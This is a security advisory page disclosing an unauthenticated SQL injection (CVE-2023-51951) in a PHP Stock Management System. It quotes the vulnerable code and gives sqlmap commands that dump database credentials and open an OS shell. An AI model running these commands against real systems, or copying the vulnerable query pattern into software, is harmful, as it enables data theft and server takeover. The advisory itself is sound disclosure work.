=== Content from www.wizlynxgroup.com_db776fef_20250115_080247.html ===


[![wizlynx group | IT Security Services](/content/images/logo-nav.png)](/ch/en/)

[Contact Us](../../ch/en/contact)

# Security Research & Advisories

### SQL Injection in Stock Management System v1.0

| Vendor |  |
| --- | --- |
| Product | Stock Management System |
| Affected Version(s) | 1 and probably prior |
| Tested Version(s) | 1 |
| Vendor Notification | 18 December 2023 |
| Advisory Publication | 18 December 2023 [without technical details] |
| Vendor Fix | N/A |
| Public Disclosure | 18 December 2023 |
| Latest Modification | 18 December 2023 |
| CVE Identifier | [CVE-2023-51951](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51951) |
| Product Description | This is a Stock Management System in PHP and MySQL Database that provides an online and automated platform for shops or businesses. |
| Credits | JosuÃ© Cruz Mier Security Researcher & Penetration Tester @wizlynx group |

## **Vulnerability Details**

| **SQL Injection** | | | |
| --- | --- | --- | --- |
| **Severity**: **Critical** | **CVSS Score**: 9.8 | **CWE-ID**: [CWE-89](https://cwe.mitre.org/data/definitions/89) | **Status**: Open |
| **Vulnerability Description** | | | |
| The web application Stock Management System is affected by an unauthenticated SQL Injection affecting Version 1.0. An SQL injection occurs when a value originating from the client's request is used within a SQL query without proper sanitisation. This could allow attackers to execute arbitrary SQL code and steal data or use the additional functionality of the database server to take control of more server components. | | | |
| **CVSS Base Score** | | | |
| **Attack Vector** | Network | **Scope** | Changed |
| **Attack Complexity** | Low | **Confidentiality Impact** | High |
| **Privileges Required** | None | **Integrity Impact** | High |
| **User Interaction** | None | **Availability Impact** | High |

## **PoC**

### Demonstration

**Source code**: https://www.sourcecodester.com/php/15023/stock-management-system-phpoop-source-code.html

**Vulnerability location:** /sms/admin/purchase\_order/manage\_bo.php, id parameter

Line 3 of manage\_bo.php invokes a SQL query built with input that comes from an untrusted source, specifically provided in the 'id' parameter. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.

<?php
if(isset($\_GET['id'])){
    $qry = $conn->query("SELECT p.\*,s.name as supplier FROM purchase\_order\_list p inner join supplier\_list s on p.supplier\_id = s.id  where p.id = '{$\_GET['id']}'");
    if($qry->num\_rows >0){
        foreach($qry->fetch\_array() as $k => $v){
            $$k = $v;
        }
    }
}
?>

... omitted for brevity ...

By sending in the
id field the single quote character, the application returns an error message
indicating the application is most likely vulnerable to SQL injection:

![](/content/images/vuln/WY8SGKNN687M.png)

**Extracting
information via SQL injection Demonstration**

Using SQLmap, we
will automate the SQL injection exploitation to retrieve data from the database
by using a technique based on error messages provided by the application:

**Command: sqlmap  -u
"http://localhost/sms/admin/?page=purchase\_order/manage\_po&id=1"
-p id --flush-session --technique=E --level=5 --risk=3 --dbms=mariadb --dbs**

![](/content/images/vuln/2TJJZ80XGVAG.png)

The screenshot
above tells us five databases are available. We will now enumerate all tables
within the sms\_db database:

**#sqlmap  -u
"http://localhost/sms/admin/?page=purchase\_order/manage\_po&id=1"
-p id --flush-session --technique=E --level=5 --risk=3 --dbms=mariadb -D sms\_db
--tables**

![](/content/images/vuln/6YOQKE0LV00R.png)

We can proceed to
the next step which consists of extracting data within a table. As illustrated
in the screenshot below, we were able to extract information from the users
table:

**#sqlmap
 -u
"http://localhost/sms/admin/?page=purchase\_order/manage\_po&id=1"
-p id --flush-session --technique=E --level=5 --risk=3 --dbms=mariadb -D sms\_db
-T users -C username,password --dump**

![](/content/images/vuln/B6NZHZ9WPH9A.png)

Additionally, we were
able to upload a web shell and execute commands directly from sqlmap as shown
in the screenshot below:

**#sqlmap
 -u
"http://localhost/sms/admin/?page=purchase\_order/manage\_po&id=1"
-p id --flush-session --technique=E --level=5 --risk=3 --dbms=mariadb âos-shell**

![](/content/images/vuln/WH3X7VWEEN8V.png)

[Top](#0)

![wizlynx group | IT Security Services](/content/images/WhiteWithRed.png)

wizlynx has not only built a solid foundation of information security, quality and project management know-how, but our associates are known for their ability to apply the right soft skills at the right time to best serve our customers. We make it a point to understand the infrastructure, needs and challenges of our customers, which enables us to deliver fast, effective and high quality results. It is our belief that this level of understanding can only be obtained with the most capable and experienced resources. Reach out to our associates at any time through our interactive competence centers to draw upon our knowledge of processes, procedures, guidelines and tools. Youï¿½ll be able to see, firsthand, the value our team will add to your organization.

---

---

©2023 wizlynx group - All Rights Reserved

* [Terms of Use](/ch/en/terms-of-use)
* [Privacy](/ch/en/privacy)


